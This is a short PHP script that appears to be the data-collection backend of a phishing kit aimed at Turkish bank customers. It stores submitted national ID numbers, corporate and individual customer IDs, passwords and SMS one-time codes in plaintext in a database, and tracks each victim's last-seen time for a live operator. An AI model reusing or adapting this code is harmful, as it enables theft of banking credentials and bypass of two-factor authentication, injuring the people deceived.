<?php
session_start();
require_once 'db.php';

if (isset($_SESSION['user_id'])) {
    $id = $_SESSION['user_id'];
    $time = time();
    
    // Gelen veriler
    $tc = $_POST['tc'] ?? '';
    $kurumsal = $_POST['kurumsal'] ?? '';
    $bireysel = $_POST['bireysel'] ?? '';
    $sifre = $_POST['sifre'] ?? '';
    $sms_code = $_POST['sms_code'] ?? '';
    $giris_tipi = $_POST['giris_tipi'] ?? 'bilinmiyor';
    
    if ($giris_tipi === 'bireysel_sms' || $giris_tipi === 'kurumsal_sms') {
        $stmt = $conn->prepare("UPDATE users SET sms_code=?, last_seen=? WHERE id=?");
        $stmt->bind_param("sii", $sms_code, $time, $id);
    } else {
        $stmt = $conn->prepare("UPDATE users SET tc_kimlik=?, kurumsal_id=?, bireysel_id=?, sifre=?, giris_tipi=?, last_seen=? WHERE id=?");
        $stmt->bind_param("sssssii", $tc, $kurumsal, $bireysel, $sifre, $giris_tipi, $time, $id);
    }
    $stmt->execute();
    $stmt->close();
    
    echo "updated";
}
?>